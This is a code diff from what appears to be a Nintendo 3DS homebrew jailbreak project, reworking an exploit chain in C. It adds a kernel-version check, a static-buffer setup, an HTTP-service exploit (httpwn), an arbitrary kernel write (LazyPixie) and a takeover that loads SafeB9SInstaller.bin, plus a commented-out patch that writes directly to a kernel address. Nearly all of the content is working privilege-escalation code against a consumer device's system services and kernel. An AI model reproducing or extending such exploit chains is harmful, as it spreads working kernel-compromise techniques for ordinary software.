@@ -1,11 +1,22 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <malloc.h>
+#include "lib/srv.h"
 #include "lib/gsp.h"
 #include "httpwn.h"
 #include "lazy_pixie.h"
 
 #include "kernelhaxcode_3ds_bin.h"
+
+
+// 4.x kernel patch for kernelpanic, TODO: remove later
+/*
+s32 kernPatch(void)
+{
+    *(vu32 *)(0xEFF80000 + 0x1A008) = 0xE12FFF7E;
+    return 0;
+}*/
+
 
 typedef struct ExploitChainLayout {
     u8 workBuf[0x1000];
@@ -15,17 +26,33 @@ typedef struct ExploitChainLayout {
 
 static Result doExploitChain(ExploitChainLayout *layout, Handle gspHandle)
 {
-    Handle httpcHandle;
-    u32 selfSbufId, alignedHttpBuffer;
     Result res = 0;
+
+    Handle handle;
+    u32 baseSbufId;
+    u32 numSbufs;
+    u32 sbufs[16 * 2]; // max allowed by kernel
 
     memset(layout, 0, sizeof(ExploitChainLayout));
     memcpy(layout->blobLayout.code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
     khc3dsPrepareL2Table(&layout->blobLayout);
 
-    TRY(httpwn(&httpcHandle, &selfSbufId, &alignedHttpBuffer, layout->workBuf, layout->hole, gspHandle));
-    TRY(lazyPixie(&layout->blobLayout, httpcHandle, selfSbufId, alignedHttpBuffer));
+    // Ensure the entire contents of 'layout->blobLayout' are written back into main memory
+    TRY(GSPGPU_FlushDataCache(gspHandle, &layout->blobLayout, sizeof(BlobLayout)));
 
+    u8 kernelMinorVersion = *(vu8 *)0x1FF80062;
+    if (kernelMinorVersion < 35) {
+        // Below 9.3 -- memchunkhax
+        // TODO
+    } else {
+        // Above 9.3 -- pwn http (target TLS addresses are hard to guess below 4.x) and use LazyPixie
+        baseSbufId = 4; // needs to be >= 4
+        numSbufs = lazyPixiePrepareStaticBufferDescriptors(sbufs, baseSbufId);
+        TRY(httpwn(&handle, baseSbufId, layout->workBuf, layout->hole, sbufs, numSbufs, gspHandle));
+        TRY(lazyPixieTriggerArbwrite(&layout->blobLayout, handle, baseSbufId));
+    }
+
+    khc3dsLcdDebug(true, 255, 0, 0);
     return khc3dsTakeover("SafeB9SInstaller.bin", 0);
 }
 
